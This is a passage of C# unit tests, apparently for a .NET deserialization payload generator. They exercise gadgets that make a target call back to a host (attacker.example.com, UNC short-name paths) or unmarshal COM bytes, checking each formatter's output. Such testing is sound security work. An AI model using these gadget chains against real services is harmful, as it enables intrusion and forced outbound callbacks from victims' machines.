        //    gadget (DataViewManagerXxe fetches its DTD, PictureBox loads its URL), so it is
        //    ALLOWED and must actually work, for every formatter.
        //  - variant 2 ships the operator's own unparsed bytes into a native COM unmarshaller,
        //    which can crash the process, so it stays REFUSED - the line AssemblyInstallerLoad
        //    draws for the same reason.
        //
        // Loopback is used throughout, so the allowed half calls the local RPC resolver and
        // nothing leaves the machine.
        private static void WbemClassObjectUnmarshalSelfTestPolicy()
        {
            foreach (string formatter in WbemFormatters)
            {
                // Variant 1: -t is accepted AND the payload still comes back. A gadget that
                // silently swallowed the flag would also "succeed" here, so the payload is
                // compared against the same gadget run without -t: identical bytes prove the
                // self-test changed nothing about what ships.
                RunResult tested = GenerateWbemWithTest(formatter, 1, WbemLoopbackHost);
                AssertTrue(tested.Success, formatter + " variant 1 accepts -t: " + tested.ErrorMessage);
                AssertTrue(tested.Raw != null, formatter + " variant 1 still returns a payload under -t");

                RunResult plain = GenerateWbem(formatter, false, 1, WbemLoopbackHost);
                AssertTrue(plain.Success, formatter + " variant 1 generates without -t: " + plain.ErrorMessage);
                AssertTrue(ByteEquals(Bytes(tested.Raw), Bytes(plain.Raw)),
                    formatter + " variant 1 emits the same payload with and without -t");

                // Variant 2: refused before anything is serialized.
                RunResult refused = GenerateWbemWithTest(formatter, 2, WbemLoopbackHost);
                string label = formatter + " variant 2";
                AssertTrue(!refused.Success, label + " with -t is refused");
                AssertTrue((refused.ErrorMessage ?? "").Contains("-t"),
                    label + ": the refusal names -t: " + refused.ErrorMessage);
                AssertTrue(refused.Raw == null, label + ": a refused run returns no payload");
            }
        }

        private static RunResult GenerateWbemWithTest(string formatter, int variant, string cmd)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = true;
            ia.ExtraArguments = new List<string>
            {
                "--" + WbemClassObjectUnmarshalGenerator.VariantOptionName, variant.ToString()
            };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = WbemGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The refusals that stop a payload which would generate cleanly and then never call
        // out. The endpoint inside an RPC string binding is ignored (OXID resolution always
        // uses port 135), so a host carrying a port must be refused rather than silently
        // stripped - stripping would build a payload that does something other than what the
        // operator asked for.
        private static void WbemClassObjectUnmarshalRefusesUnusableHosts()
        {
            var refused = new[]
            {
                new[] { "", "an empty host" },
                new[] { "   ", "a whitespace-only host" },
                new[] { "attacker.example.com:135", "a host with a colon port" },
                new[] { "attacker.example.com[135]", "a host with a bracketed endpoint" },
                new[] { "http://attacker.example.com/", "a URL" },
                new[] { "\\\\attacker\\share", "a UNC path" },
                new[] { "attacker.example.com/path", "a host with a path" },
                new[] { "two hosts", "a host containing whitespace" },
            };

            foreach (var row in refused)
            {
                RunResult r = GenerateWbem("BinaryFormatter", false, 1, row[0]);
                AssertTrue(!r.Success, row[1] + " is refused (\"" + row[0] + "\")");
                AssertTrue(r.Raw == null, row[1] + ": nothing is emitted");
            }

            // Accepted: a plain name, an IPv4 literal, and an IPv6 literal. The IPv6 case is
            // the reason the colon rule is "no port" rather than "no colon".
            foreach (string good in new[] { "attacker.example.com", "127.0.0.1", "::1", "fe80::1" })
            {
                RunResult r = GenerateWbem("BinaryFormatter", false, 1, good);
                AssertTrue(r.Success, "\"" + good + "\" is accepted: " + r.ErrorMessage);
                AssertTrue(IndexOfBytes(Bytes(r.Raw),
                        WbemClassObjectUnmarshalGenerator.BuildStandardObjRef(good)) >= 0,
                    "\"" + good + "\" reaches the payload");
            }
        }

        // Variant 2 reads a file on THIS machine and ships those bytes untouched. Nothing
        // about the contents is parsed, so the tests are about the file rules and about the
        // bytes arriving unchanged - never about what the blob means.
        private static void WbemClassObjectUnmarshalPreparedBlobVariant()
        {
            // Not a real OBJREF on purpose: this variant ships whatever it is given, and no
            // test ever deserializes it.
            byte[] prepared = new byte[256];
            for (int i = 0; i < prepared.Length; i++)
                prepared[i] = (byte)(i & 0xFF);

            string blobPath = TestArtifactPath("ysonet_wbem_prepared.bin");
            SafeDelete(blobPath);
            try
            {
                File.WriteAllBytes(blobPath, prepared);
                AssertTrue(File.Exists(blobPath), "the prepared blob fixture survives being written");

                foreach (string formatter in WbemFormatters)
                {
                    RunResult r = GenerateWbem(formatter, false, 2, blobPath);
                    AssertTrue(r.Success, formatter + " ships a prepared blob: " + r.ErrorMessage);

                    byte[] searchable = WbemSearchableBytes(formatter, r.Raw);
                    if (WbemCarriesRawBytes(formatter))
                        AssertTrue(IndexOfBytes(searchable, prepared) >= 0,
                            formatter + " carries the prepared bytes verbatim");
                    else
                        AssertTrue(StripWs(Encoding.UTF8.GetString(searchable))
                                .Contains(Convert.ToBase64String(prepared)),
                            formatter + " carries the prepared bytes as base64");
                }

                // An empty file would fail on the target before reaching the COM call, so it
                // is refused here where the operator can see why.
                string emptyPath = TestArtifactPath("ysonet_wbem_empty.bin");
                SafeDelete(emptyPath);
                try
                {
                    File.WriteAllBytes(emptyPath, new byte[0]);
                    RunResult empty = GenerateWbem("BinaryFormatter", false, 2, emptyPath);
                    AssertTrue(!empty.Success, "an empty blob file is refused");
                }
                finally { SafeDelete(emptyPath); }

                RunResult missing = GenerateWbem("BinaryFormatter", false, 2, blobPath + ".nope");
                AssertTrue(!missing.Success, "a missing blob file is refused");

                // Variant 1's host rules must NOT be applied to variant 2's file path, which
                // legitimately contains a drive colon and backslashes.
                AssertTrue(GenerateWbem("BinaryFormatter", false, 2, blobPath).Success,
                    "a normal Windows path is not mistaken for a host with a port");
            }
            finally { SafeDelete(blobPath); }
        }

        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel
        // only renders BodyRows lines, so a long one silently pushes the formatter, command
        // input and category lines off the visible area. This gadget has a lot to say (a
        // callback, a fixed port, a refused -t), which is exactly the case that overflows.
        private static void WbemClassObjectUnmarshalInfoPanelStillShowsItsFacts()
        {
            AssertInfoPanelKeepsItsFacts(WbemGadget);
            var ed = new ModuleEditor(null, null, true, null, null);

            // The variant selector must reach the editor too, so both variants are usable
            // from the interactive build and not only from the command line.
            EditableField variant = FindEditable(ed.BuildFieldsForTest(WbemGadget),
                WbemClassObjectUnmarshalGenerator.VariantOptionName);
            AssertTrue(variant != null && !variant.Hidden,
                "the editor offers the " + WbemClassObjectUnmarshalGenerator.VariantOptionName
                    + " setting");
            AssertTrue(!string.IsNullOrEmpty(variant.Help),
                "the variant setting carries its help text into the editor");
        }

        // The bare type name, which is what SoapFormatter and the XML formats use as an
        // element name.
        private const string WbemBareTypeName = "IWbemClassObjectFreeThreaded";

        // LosFormatter's payload is base64 TEXT wrapping a BinaryFormatter stream, so the type
        // name and the blob only become visible after decoding it. Every other formatter is
        // already searchable as it stands.
        private static byte[] WbemSearchableBytes(string formatter, object raw)
        {
            if (formatter == "LosFormatter")
                return Convert.FromBase64String(Text(raw).Trim());
            return Bytes(raw);
        }

        // The two formats that carry the byte[] as a raw BinaryFormatter record rather than
        // as base64 text.
        private static bool WbemCarriesRawBytes(string formatter)
        {
            return formatter == "BinaryFormatter" || formatter == "LosFormatter";
        }

        private static byte[] Slice(byte[] source, int offset, int length)
        {
            var result = new byte[length];
            Array.Copy(source, offset, result, 0, length);
            return result;
        }

        private static bool ByteEquals(byte[] a, byte[] b)
        {
            if (a == null || b == null || a.Length != b.Length)
                return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i])
                    return false;
            return true;
        }

        private static int IndexOfBytes(byte[] haystack, byte[] needle)
        {
            if (haystack == null || needle == null || needle.Length == 0
                || haystack.Length < needle.Length)
                return -1;
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool hit = true;
                for (int j = 0; j < needle.Length; j++)
                    if (haystack[i + j] != needle[j]) { hit = false; break; }
                if (hit)
                    return i;
            }
            return -1;
        }

        private static string StripWs(string value)
        {
            var sb = new StringBuilder(value.Length);
            foreach (char c in value)
                if (!char.IsWhiteSpace(c))
                    sb.Append(c);
            return sb.ToString();
        }

        // ---- FileSystemInfo ----------------------------------------------------

        private const string FsiGadget = "FileSystemInfo";

        // Every formatter the gadget advertises. The proof that each one really drives the
        // serialization constructor is FileSystemInfoReachesThePathNormalizer below (normal
        // tier, no I/O at all) and FireFileSystemInfoShortNameExpansion (FULL tier, a real
        // 8.3 name resolved through GetLongPathNameW).
        private static readonly string[] FsiFormatters =
        {
            "BinaryFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer",
            "DataContractSerializer", "DataContractJsonSerializer", "Json.NET"
        };

        private static readonly int[] FsiVariants =
        {
            FileSystemInfoGenerator.VariantDirectoryInfo,
            FileSystemInfoGenerator.VariantFileInfo,
        };

        // A RELATIVE path with a short-name component. Relative is the point: normalization
        // has to root it against the current directory, so the deserialized object's FullName
        // differs from what the payload carried, and only the constructor could have done
        // that. Nothing with this name exists, so GetLongPathNameW fails locally and normalizing
        // falls back to the rooted path. No file is opened and no network is touched.
        private const string FsiRelativeShortNamePath = @"zz_ysnt~1\x";

        private static string FsiTargetTypeName(int variant)
        {
            return variant == FileSystemInfoGenerator.VariantFileInfo
                ? FileSystemInfoGenerator.FileInfoTypeName
                : FileSystemInfoGenerator.DirectoryInfoTypeName;
        }

        private static string FsiClrName(int variant)
        {
            return variant == FileSystemInfoGenerator.VariantFileInfo
                ? FileSystemInfoGenerator.FileInfoClrName
                : FileSystemInfoGenerator.DirectoryInfoClrName;
        }

        private static RunResult GenerateFsi(string formatter, bool minify, int variant, string cmd)
        {
            return GenerateFsi(formatter, minify, variant, cmd, false);
        }

        private static RunResult GenerateFsi(string formatter, bool minify, int variant, string cmd,
            bool test)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Minify = minify;
            ia.Test = test;
            ia.ExtraArguments = new List<string>
            {
                "--" + FileSystemInfoGenerator.VariantOptionName, variant.ToString()
            };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = FsiGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Read the payload back with the serializer the target would use, and hand back the
        // object it produced. DataContractJsonSerializer writes no type name, so it is the one
        // that needs the root type - which is exactly why this cannot be a row in the shared
        // deserializer-tag table.
        private static object DeserializeFsi(string formatter, int variant, object raw)
        {
            switch (formatter)
            {
                case "BinaryFormatter": return SerializersHelper.BinaryFormatter_deserialize(Bytes(raw));
                case "SoapFormatter": return SerializersHelper.SoapFormatter_deserialize(Text(raw));
                case "LosFormatter": return SerializersHelper.LosFormatter_deserialize(Bytes(raw));
                case "NetDataContractSerializer":
                    return SerializersHelper.NetDataContractSerializer_deserialize(Text(raw));
                case "DataContractSerializer":
                    return SerializersHelper.DataContractSerializer_deserialize(
                        Text(raw), null, "root", "type");
                case "DataContractJsonSerializer":
                    return SerializersHelper.DataContractJsonSerializer_deserialize(
                        Text(raw), Type.GetType(FsiTargetTypeName(variant), true), null);
                case "Json.NET": return SerializersHelper.JsonNet_deserialize(Text(raw));
                default: throw new Exception("no deserializer for " + formatter);
            }
        }

        // Same, with the cell named in any failure. A bare serializer exception says nothing
        // about which of sixteen combinations produced it, which turns one bad cell into a
        // hunt.
        private static object DeserializeFsiOrFail(string formatter, int variant, object raw,
            string label)
        {
            try { return DeserializeFsi(formatter, variant, raw); }
            catch (Exception ex)
            {
                // The innermost message too: several of these serializers wrap the real
                // reason ("no such member", "cannot cast") in a generic outer one, and the
                // outer one alone points nowhere near the document that caused it.
                Exception root = ex;
                while (root.InnerException != null) root = root.InnerException;
                string detail = ReferenceEquals(root, ex) ? ""
                    : " (inner " + root.GetType().Name + ": " + root.Message + ")";
                throw new Exception(label + ": deserializing threw "
                    + ex.GetType().Name + ": " + ex.Message + detail, ex);
            }
        }

        // THE EFFECT PROOF THAT NEEDS NO NETWORK AND NO 8.3 SUPPORT.
        //
        // The sink is FileSystemInfo's serialization constructor, which passes the FullPath
        // member through Path.GetFullPathInternal. Handing it a RELATIVE path makes that
        // normalization observable with certainty: the object that comes back reports the
        // ROOTED path, which nothing but the constructor could have produced. A serializer that
        // rebuilt the object without driving the constructor would return one with a null
        // FullPath (the DataViewManagerXxe trap: a real object, no exception, no effect), and a
        // serializer that never resolved the type would return something else entirely.
        //
        // The remote half - that the same normalization asks a REMOTE host to expand a short
        // name - is FireFileSystemInfoShortNameExpansion (locally, through GetLongPathNameW)
        // and FileSystemInfoUncCallbackIsObservedOutOfBand (over the wire, opt-in).
        private static void FileSystemInfoReachesThePathNormalizer()
        {
            string expected = Path.GetFullPath(FsiRelativeShortNamePath);
            AssertTrue(!string.Equals(expected, FsiRelativeShortNamePath, StringComparison.Ordinal),
                "the fixture path is relative, so normalizing it really does change it");

            foreach (string formatter in FsiFormatters)
            {
                foreach (int variant in FsiVariants)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        string label = formatter + " variant " + variant + (minify ? " --minify" : "");
                        RunResult r = GenerateFsi(formatter, minify, variant, FsiRelativeShortNamePath);
                        AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);

                        object o = DeserializeFsiOrFail(formatter, variant, r.Raw, label);
                        AssertTrue(o != null, label + " produces an object");

                        // The exact concrete type the variant asked for, not merely something
                        // that smells right.
                        AssertEqual(FsiClrName(variant), o.GetType().FullName,
                            label + " rebuilds the type the variant names");

                        var info = o as FileSystemInfo;
                        AssertTrue(info != null, label + " produces a FileSystemInfo");
                        AssertEqual(expected, info.FullName,
                            label + " ran Path.GetFullPathInternal on the FullPath member: the "
                                + "object reports the ROOTED path, so the serialization "
                                + "constructor - the gadget's whole sink - really executed");
                    }
                }
            }
        }

        // Every advertised formatter must name the exact target type and both members the
        // serialization constructor reads, and must carry the path unchanged. The path IS the
        // payload, so a rewritten one still deserializes and simply normalizes something else.
        private static void FileSystemInfoCarriesTheTargetTypeAndPath()
        {
            // Awkward on purpose: every backslash needs JSON escaping, and the apostrophe is
            // the character this project has measured one JSON parser silently deleting when
            // the wrong escaper is used. The "; " sequence is deliberately NOT here - it is
            // genuinely lossy under the XML minifier, and FileSystemInfoRefusesAPathItWouldRewrite
            // owns that case.
            const string path = @"\\host.example.com\sha're\aaaaaa~1\a b";

            foreach (string formatter in FsiFormatters)
            {
                foreach (int variant in FsiVariants)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        string label = formatter + " variant " + variant + (minify ? " --minify" : "");
                        RunResult r = GenerateFsi(formatter, minify, variant, path);
                        AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);

                        byte[] searchable = FsiSearchableBytes(formatter, r.Raw);
                        string text = Encoding.UTF8.GetString(searchable);

                        // SoapFormatter is the one that does not spell the type out in one
                        // piece: it writes the bare name as the element and puts the CLR
                        // namespace and assembly in an xmlns.
                        if (formatter == "SoapFormatter")
                        {
                            AssertTrue(text.Contains(FsiBareTypeName(variant)),
                                label + " names the " + FsiBareTypeName(variant) + " element");
                            // SOAP names mscorlib types by CLR NAMESPACE only: mscorlib is
                            // the default assembly, so there is no assembly part to look for.
                            AssertTrue(text.Contains("clr/ns/System.IO"),
                                label + " names the System.IO clr namespace");
                        }
                        else if (formatter == "DataContractJsonSerializer")
                        {
                            // By design it carries no type name at all: the consumer fixes the
                            // root type. Asserting its ABSENCE is what keeps that documented.
                            AssertTrue(!text.Contains(FsiClrName(variant)),
                                label + " carries no type name, because the target names the "
                                    + "root type itself");
                        }
                        else
                        {
                            AssertTrue(text.Contains(FsiClrName(variant)),
                                label + " names " + FsiClrName(variant));
                        }

                        AssertTrue(text.Contains(FileSystemInfoGenerator.FullPathMemberName),
                            label + " names the " + FileSystemInfoGenerator.FullPathMemberName
                                + " member, which is the one that reaches the normalizer");
                        AssertTrue(text.Contains(FileSystemInfoGenerator.OriginalPathMemberName),
                            label + " names the " + FileSystemInfoGenerator.OriginalPathMemberName
                                + " member, without which GetString throws before the object exists");

                        // And the path itself survived generation, escaping and minification.
                        // Proven through the real deserializer rather than by searching the
                        // document, because each format escapes it differently.
                        var info = DeserializeFsiOrFail(formatter, variant, r.Raw, label) as FileSystemInfo;
                        AssertTrue(info != null, label + " produces a FileSystemInfo");
                        AssertEqual(path, info.FullName,
                            label + " delivered the path unchanged (a UNC path is already rooted, "
                                + "so normalizing it leaves it alone)");
                    }
                }
            }
        }

        // The path IS the payload, so a payload that no longer carries it exactly is worse than
        // no payload: it still deserializes and simply normalizes a path nobody chose. Two
        // things in this project rewrite text in a payload - the XML minifier's "a; b" -> "a;b"
        // dirty-match pass, and an XmlWriter's newline handling - so the gadget serializes,
        // VERIFIES, and refuses rather than predicting which characters are at risk.
        //
        // The rule this locks is "every cell either delivers the path exactly or refuses",
        // never a hardcoded list of lossy formatters: the minifier is allowed to change, and a
        // list would then be quietly wrong in whichever direction it drifted.
        private static void FileSystemInfoRefusesAPathItWouldRewrite()
        {
            // "; " is the sequence the XML minifier collapses.
            const string path = @"\\host.example.com\share\aaaaaa~1\a; b";
            int refused = 0;

            foreach (string formatter in FsiFormatters)
            {
                foreach (bool minify in new[] { false, true })
                {
                    string label = formatter + (minify ? " --minify" : "");
                    RunResult r = GenerateFsi(formatter, minify,
                        FileSystemInfoGenerator.VariantDirectoryInfo, path);

                    if (!r.Success)
                    {
                        refused++;
                        AssertTrue((r.ErrorMessage ?? "").Contains(path),
                            label + ": the refusal quotes the path it could not deliver: "
                                + r.ErrorMessage);
                        AssertTrue(r.Raw == null,
                            label + ": a refused run returns no payload rather than a broken one");

                        // Both binary streams carry string records verbatim, so a refusal there
                        // would mean the guard itself had broken.
                        AssertTrue(formatter != "BinaryFormatter" && formatter != "LosFormatter",
                            label + ": this formatter carries the string unchanged and must "
                                + "never refuse");
                        continue;
                    }

                    var info = DeserializeFsiOrFail(formatter,
                        FileSystemInfoGenerator.VariantDirectoryInfo, r.Raw, label) as FileSystemInfo;
                    AssertTrue(info != null, label + " produces a FileSystemInfo");
                    AssertEqual(path, info.FullName,
                        label + ": a cell that did NOT refuse must have delivered the path "
                            + "exactly, or the guard let a corrupted payload through");
                }
            }

            AssertTrue(refused > 0,
                "at least one cell is refused, so this test proves the guard fires rather than "
                    + "passing because nothing is lossy any more");

            // --rawinput hands the escaping and the checking to the operator, so it must not
            // refuse: the point of the switch is to build the payload they asked for.
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Minify = true;
            ia.ExtraArguments = new List<string> { "--" + FileSystemInfoGenerator.RawInputOptionName };
            RunResult raw = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = FsiGadget,
                FormatterName = "NetDataContractSerializer",
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(raw.Success,
                "--rawinput builds the payload the operator asked for instead of refusing it: "
                    + raw.ErrorMessage);
        }

        // LosFormatter's payload is base64 TEXT wrapping a BinaryFormatter stream, so nothing
        // inside it is visible until it is decoded. Every other formatter is already searchable.
        private static byte[] FsiSearchableBytes(string formatter, object raw)
        {
            if (formatter == "LosFormatter")
                return Convert.FromBase64String(Text(raw).Trim());
            return Bytes(raw);
        }

        private static string FsiBareTypeName(int variant)
        {
            return variant == FileSystemInfoGenerator.VariantFileInfo ? "FileInfo" : "DirectoryInfo";
        }

        // The gadget REFUSES NOTHING about the path, on purpose: what a given target's path
        // handling does with a value is the thing an operator uses this gadget to find out, and
        // a shape rule here would block that research (the same call the maintainer made for
        // DataSetXxe). What it does instead is tell the truth under --debugmode, so the honesty
        // of that note is what has to be locked.
        //
        // The rule itself is mscorlib's, read out of LongPathHelper.Normalize: some path
        // COMPONENT contains '~' and is at most 12 characters. Both halves matter and both are
        // easy to get wrong, so each case below names which one it exercises.
        private static void FileSystemInfoShortNameRuleMatchesTheFramework()
        {
            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host\share\aaaaaa~1\x"),
                "the canonical shape expands");
            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host\share\aaaaaa~1"),
                "a short-name component at the END expands too: Normalize applies the same "
                    + "length test after its loop, so a rule demanding a trailing component "
                    + "would reject a path that really does call out");
            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host\share\~\x"),
                "a one-character component containing '~' expands");
            AssertTrue(!FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host\share\123456789012~\x"),
                "a '~' component longer than "
                    + FileSystemInfoGenerator.MaxShortNameComponentLength
                    + " characters does not expand");

            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"C:\PROGRA~1\x"),
                "a local path is judged by the same rule; nothing about this is UNC specific");
            AssertTrue(!FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host\share\file"),
                "a plain UNC path does not expand, which is why the OOB control uses one");
            // Surprising and deliberate: mscorlib starts the component scan just after the
            // leading "\\", so the HOST is a component like any other. \\host~1\share\file
            // therefore does expand, and a note claiming otherwise would be wrong.
            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"\\host~1\share\file"),
                "a '~' in the host is still a path component, and mscorlib measures it from "
                    + "just after the leading backslashes");
            AssertTrue(!FileSystemInfoGenerator.ShortNameExpansionApplies(""),
                "an empty path expands nothing");
            AssertTrue(!FileSystemInfoGenerator.ShortNameExpansionApplies(null),
                "a null path expands nothing");

            // Forward slashes are path separators to Windows too, so the component split has to
            // honour them or a mixed-separator path is judged as one long component.
            AssertTrue(FileSystemInfoGenerator.ShortNameExpansionApplies(@"//host/share/aaaaaa~1/x"),
                "forward slashes split components as well");

            // And now the part that matters more than the rule: NOTHING is refused. Every shape
            // above, plus values that are not paths at all, still produce a payload.
            string[] neverRefused =
            {
                @"\\host\share\file",                 // will not call out, and that is allowed
                @"C:\Windows\System32\drivers\etc",   // a local path
                @"relative\path",                     // a relative path
                @"http://example.com/x",              // not a path at all
                @"\\host\share\a-very-long-name~1\x", // a '~' component that is too long
            };
            foreach (string value in neverRefused)
            {
                RunResult r = GenerateFsi("BinaryFormatter", false,
                    FileSystemInfoGenerator.VariantDirectoryInfo, value);
                AssertTrue(r.Success, "\"" + value + "\" is not refused: " + r.ErrorMessage);
                AssertTrue(!RawIsEmpty(r.Raw), "\"" + value + "\" still produces a payload");
            }

            // The only input the gadget does refuse is an empty one, because there would be no
            // payload to build.
            RunResult empty = GenerateFsi("BinaryFormatter", false,
                FileSystemInfoGenerator.VariantDirectoryInfo, "");
            AssertTrue(!empty.Success, "an empty -c is refused");
        }

        // -t deserializes in THIS process, so it runs the target's serialization constructor
        // here. By the project's corrected rule that is ALLOWED: a callout is not damage, and
        // seeing the callback is what -t is for on a network gadget (DataViewManagerXxe fetches
        // its DTD, PictureBox loads its URL, WbemClassObjectUnmarshal variant 1 resolves its
        // host). The path below is LOCAL and does not exist, so the self-test normalizes and
        // nothing leaves this machine.
        //
        // A gadget that silently swallowed -t would also "succeed" here, so the payload is
        // compared against the same cell generated without -t: identical output proves the
        // self-test changed nothing about what ships.
        private static void FileSystemInfoAcceptsSelfTest()
        {
            foreach (string formatter in FsiFormatters)
            {
                foreach (int variant in FsiVariants)
                {
                    string label = formatter + " variant " + variant;
                    RunResult tested = GenerateFsi(formatter, false, variant,
                        FsiRelativeShortNamePath, true);
                    AssertTrue(tested.Success, label + " accepts -t: " + tested.ErrorMessage);
                    AssertTrue(!RawIsEmpty(tested.Raw), label + " still returns a payload under -t");

                    RunResult plain = GenerateFsi(formatter, false, variant, FsiRelativeShortNamePath);
                    AssertTrue(plain.Success, label + " generates without -t: " + plain.ErrorMessage);
                    AssertTrue(ByteEquals(Bytes(plain.Raw), Bytes(tested.Raw)),
                        label + ": -t did not change the payload that ships");
                }
            }
        }

        // The metadata an operator searches on. Locked here rather than left to the generic
        // audit table, because every value has a reason a future edit could quietly break.
        private static void FileSystemInfoDeclaresItsFacets()
        {
            var g = GadgetRegistry.CreateGadgetInstance(FsiGadget) as GenericGenerator;
            AssertTrue(g != null, "the gadget loads");

            AssertEqual(CommandInputType.UncPath, g.CommandInput(),
                "-c is a UNC path the TARGET reaches, not a file this machine reads");

            GadgetFacetSet facets = g.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
                "the proven effect is an outbound callback, so the kind is network");
            AssertEqual(1, facets.Kinds.Count,
                "and nothing else: a DNS or SMB observation is not file-system access, not "
                    + "information disclosure and not code execution");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "the chain is mscorlib only");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.NetFramework),
                "Path.GetFullPathInternal with short-name expansion is .NET Framework behaviour");

            // The versions are evidence, not a guess: FireFileSystemInfoShortNameExpansion
            // records what actually fired, and VersionEvidenceMatchesThisRuntime fails the run
            // when a claim and the observation disagree.
            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the effect was observed on");

            List<GadgetVariant> variants = g.Variants();
            AssertEqual(2, variants.Count, "two concrete FileSystemInfo subclasses");
            foreach (GadgetVariant v in variants)
            {
                AssertEqual(0, v.UnsupportedFormatters.Count,
                    "variant " + v.Number + " narrows nothing: both variants differ only in the "
                        + "type token, so every formatter carries both");
                AssertTrue(v.FacetOverride == null,
                    "variant " + v.Number + " inherits the gadget facets, because they are the "
                        + "same for both");
            }

            // The formatter list is the ISerializable-CONSTRUCTOR set and nothing else. Naming
            // the excluded ones is the point: a later edit that adds a property-setter format
            // would be advertising a cell that cannot fire.
            List<string> formatters = g.SupportedFormatters();
            AssertEqual(FsiFormatters.Length, formatters.Count,
                "the advertised formatter count matches what the tests prove");
            foreach (string f in FsiFormatters)
                AssertTrue(g.IsSupported(f), f + " is advertised");
            foreach (string f in new[]
                {
                    Formatters.Xaml, Formatters.XmlSerializer, Formatters.JavaScriptSerializer,
                    Formatters.YamlDotNet, Formatters.FastJson, Formatters.SharpSerializerXml,
                    Formatters.SharpSerializerBinary, Formatters.MessagePackTypeless,
                    Formatters.MessagePackTypelessLz4,
                })
                AssertTrue(!g.IsSupported(f), f + " sets members by name and can never drive an "
                    + "ISerializable constructor, so it must not be advertised");

            // FsPickler is the one exclusion the ISerializable rule does NOT explain: it drives
            // ISerializable constructors happily (DataSetXxe ships a FsPickler payload). It
            // refuses this TYPE, which is a different and stronger reason, so it is asserted
            // rather than argued.
            AssertTrue(!g.IsSupported(Formatters.FsPickler),
                "FsPickler is not advertised");
            RunResult refused = GenerateFsi(Formatters.FsPickler, false,
                FileSystemInfoGenerator.VariantDirectoryInfo, FsiRelativeShortNamePath);
            AssertTrue(!refused.Success, "and the gadget refuses it rather than emitting a "
                + "document nothing can read");

            // The reason, measured rather than argued. The document below is the same shape
            // DataSetXxe's working FsPickler payload uses, with the type swapped, and it fails
            // with NonSerializableTypeException naming the TYPE - so FsPickler rejected
            // System.IO.DirectoryInfo during pickler resolution, before it ever looked at the
            // members. No document shape can work around that.
            //
            // It lives here rather than in the gadget on purpose: the gadget must only carry
            // payloads it ships, and this one is the proof of an impossible cell.
            const string fsPicklerAttempt = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
    ""_flags"": ""subtype"",
    ""subtype"": {
      ""Case"": ""NamedType"",
      ""Name"": ""System.IO.DirectoryInfo"",
      ""Assembly"": { ""Name"": ""mscorlib"", ""Version"": ""4.0.0.0"", ""Culture"": ""neutral"", ""PublicKeyToken"": ""b77a5c561934e089"" }
    },
    ""instance"": { ""serializationEntries"": [] }
  }
}";
            Exception fsp = null;
            try { SerializersHelper.FsPickler_deserialize(fsPicklerAttempt); }
            catch (Exception ex) { fsp = ex; }
            AssertTrue(fsp != null, "FsPickler refuses a document naming DirectoryInfo");
            Exception fspRoot = fsp;
            while (fspRoot.InnerException != null) fspRoot = fspRoot.InnerException;
            AssertTrue(fspRoot.Message.Contains("not serializable")
                    && fspRoot.Message.Contains(FileSystemInfoGenerator.DirectoryInfoClrName),
                "and it refuses the TYPE, not the document: " + fspRoot.GetType().Name + ": "
                    + fspRoot.Message);

            // Which is the difference from the gadget FsPickler does work for: FileSystemInfo
            // derives from MarshalByRefObject, DataSet from MarshalByValueComponent.
            AssertTrue(typeof(DirectoryInfo).IsMarshalByRef,
                "DirectoryInfo is a marshal-by-reference type");
            AssertTrue(!typeof(System.Data.DataSet).IsMarshalByRef,
                "and DataSet is not, which is why its FsPickler payload works and this one "
                    + "cannot");

            // Every token carries the "(2)" annotation, which is the only place the public
            // catalog reveals that this gadget has variants at all.
            foreach (string token in formatters)
                AssertTrue(token.EndsWith(" (2)", StringComparison.Ordinal),
                    "\"" + token + "\" is annotated with its variant count");
        }

        // AdditionalInfo() is the FIRST block of the interactive info panel and the panel only
        // renders BodyRows lines, so a long one silently pushes the formatter, command input and
        // category lines off the visible area.
        private static void FileSystemInfoInfoPanelStillShowsItsFacts()
        {
            AssertInfoPanelKeepsItsFacts(FsiGadget);
            var ed = new ModuleEditor(null, null, true, null, null);

            List<EditableField> fields = ed.BuildFieldsForTest(FsiGadget);
            foreach (string option in new[]
                {
                    FileSystemInfoGenerator.VariantOptionName,
                    FileSystemInfoGenerator.RawInputOptionName,
                })
            {
                EditableField f = FindEditable(fields, option);
                AssertTrue(f != null && !f.Hidden, "the editor offers the " + option + " setting");
                AssertTrue(!string.IsNullOrEmpty(f.Help),
                    "the " + option + " setting carries its help text into the editor");
            }
        }

        // ---- ResourceDictionary (Source fetch and remote markup load) -----------

        private const string RdGadget = "ResourceDictionary";

        private static RunResult GenerateResourceDictionary(string uri, bool minify, params string[] extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = uri;
            ia.Minify = minify;
            ia.Test = false;
            if (extra != null && extra.Length > 0) ia.ExtraArguments = new List<string>(extra);
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
